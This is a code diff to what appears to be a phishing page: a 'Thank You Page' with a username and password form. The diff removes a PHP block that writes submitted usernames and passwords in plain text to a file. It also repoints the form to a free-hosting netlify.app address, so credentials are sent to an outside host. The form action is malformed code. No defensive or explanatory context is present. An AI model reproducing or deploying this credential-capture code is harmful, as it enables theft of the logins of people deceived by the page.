@@ -1,15 +1,4 @@
-<?php
 
-$password=$_POST['password'];
-$username=$_POST['username'];
-$data=$username.",".$password;
-
-
-$file="Data.xslx";
-
-
-file_put_contents($file, $data . PHP_EOL,)
-?>
 <html>
 <head>
 <title>Thank You Page</title>  
@@ -29,7 +18,7 @@ file_put_contents($file, $data . PHP_EOL,)
     <body>
         <div class="Container">
             <img src=""/>
-            <form method="POST" action="window.open('https://afreecart.000webhostapp.com')">
+            <form method="POST" action="window.open('https://www.sakasa.netlify.app')" netlify>
                 <div class="form_input">
                     <input type="text" name="username" placeholder="enter your username"/>
                 </div>
